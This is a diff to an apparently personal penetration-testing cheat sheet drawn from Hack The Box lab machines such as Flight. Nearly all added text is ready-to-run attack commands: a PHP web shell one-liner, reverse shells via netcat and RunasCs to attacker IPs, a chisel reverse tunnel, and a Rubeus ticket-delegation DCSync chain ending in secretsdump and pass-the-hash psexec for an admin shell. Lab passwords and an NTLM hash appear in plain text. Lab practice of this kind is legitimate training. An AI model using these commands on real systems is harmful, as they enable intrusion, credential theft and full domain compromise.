@@ -2344,8 +2344,12 @@ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa TCM@10.10.2
 
 ```
 
-## TTY Shell
-
+## PHP One-liner & TTY Shells
+- PHP Shell one-liner
+```bash
+<?php system($_REQUEST['cmd']); ?>
+```
+-TTY Shell
 ```powershell
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -2663,6 +2667,7 @@ http://192.168.104.169/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "cmd /c
 # Upload file generated from badodt script
 sudo responder -I tun0 # Got the cybergeek creds, got shell apache user
 .\RunasCs.exe thecybergeek winniethepooh "C:\temp\nc.exe 192.168.45.227 4444 -e cmd.exe" -t 0
+#Without netcat, it'll not work for Invoke-RunasCs Flight-HTB, .\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.7:4455 
 rlwrap nc -nlvp 4444 # user is thecybergeek
 
 #PrivEsc user xampp running with root privileges [WerTrigger](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#exploit_1)
@@ -2982,6 +2987,16 @@ iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 .\PrintSpoofer64.exe -i -c powershell.exe
 ```
 
+#### Chisel internal port forward
+- I have a situation got access to shell, but internal IIS server is running the also port 8000 is open.
+- added .aspx shell, unable get back to my netcat, so used chisel for to connect back to my computer
+- Reference Flight HTB
+
+```powershell
+chisel server -p 8001 --reverse # Kali
+./chisel.exe client 10.10.14.7:8001 R:8002:127.0.0.1:8000   # Windows Internal Server running port 8000
+```
+
 ### AS-REP Roasting
 - If you have list of users not passwords or don't know usernames and passwords can try the <b>impacket-GetNPUsers</b> to get user hash then move forward
 - In Windows Active Directory, You have AD list of users but don't have password we can try the Impacket-GetNPUsers (Blackfield-HackTheBox)
@@ -3070,6 +3085,32 @@ ps> klist
 
 ```powershell
 ps> iwr -UseDefaultCredentials <servicename>://<computername>
+```
+
+### DCSync with impacket-ticketConverter
+- I had scenario through web user 'flight/c.bum' go a shell 'iis apppool\defaultapppool'. from here generate ticket then do DCSync
+- 'iis apppool\defaultapppool' is has SeImpersonatePrivileges you can try the PrintSpoofer64, DeadPotatos, but i tired DCSync
+- flight/c.bum is from the flight, iis apppool\defaultapppool from the g0
+- Reference Flight HTB
+
+```powershell
+# After 'iis apppool\defaultapppool' getting generating the ticket
+.\Rubeus.exe tgtdeleg /nowrap
+cat ticket.kirbi
+mv ticket.kirbi ticket.kirbi.b64
+cat ticket.kirbi.b64
+cat ticket.kirbi.b64 | base64 -d
+cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
+cat ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache # input output.ccache
+
+# IN VPN tab run this Sync time with target machine you will notice VPN drop packets
+sudo ntpdate -s flight.htb
+
+# Add the hostname into /etc/hosts file (g0.flight.htb), previously only flight.htb not working
+export KRB5CCNAME=ticket.ccache
+impacket-secretsdump -k -no-pass g0.flight.htb # GOt hashes
+impacket-psexec administrator@10.10.11.187  -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c # Got admin shell
 ```
 
 ### Secretsdump
